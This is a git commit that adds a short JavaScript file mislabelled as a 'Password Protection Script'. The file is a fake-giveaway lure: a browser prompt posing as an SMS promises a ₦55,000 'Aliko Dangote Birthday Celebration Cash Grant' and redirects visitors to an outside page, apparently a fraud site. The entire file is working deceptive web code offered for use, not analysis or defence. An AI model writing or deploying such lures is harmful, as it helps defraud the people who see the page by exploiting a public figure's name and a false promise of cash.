1f2d011845e0c8f80f35d1cfc66edd23a1a22f94
mfednewblog9 <newekpeitid@gmail.com>
2025-11-01 08:21:26 +0100

    Create aliko-active.js

---
+++ aliko-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW ₦55,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the ₦55,000 Aliko Dangote Birthday Celebration Cash Grant. Please press OK to withdraw CASH now.',
+  'WITHDRAW ₦55,000'
+);
+if (password != 'WITHDRAW ₦55,000') {
+  location.href = 'https://fhreekift.org/fg-cash.html';
+}
